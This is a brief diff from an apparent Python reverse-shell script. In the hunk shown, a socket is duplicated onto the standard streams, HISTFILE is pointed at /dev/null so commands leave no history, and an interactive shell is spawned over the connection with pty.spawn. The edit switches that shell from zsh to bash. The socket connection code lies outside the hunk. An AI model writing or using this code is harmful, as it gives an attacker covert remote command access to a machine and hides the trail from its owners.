@@ -23,7 +23,9 @@ def main():
     os.dup2(s.fileno(),2)
     os.putenv("HISTFILE",'/dev/null')
     #ChildProcess的stdio为当前process的stdio. 即s.fileno().
-    pty.spawn("/bin/zsh")              
+    shell = '/bin/zsh'
+    shell = '/bin/bash'
+    pty.spawn(shell)              
     s.close()
 	
 if __name__ == "__main__":
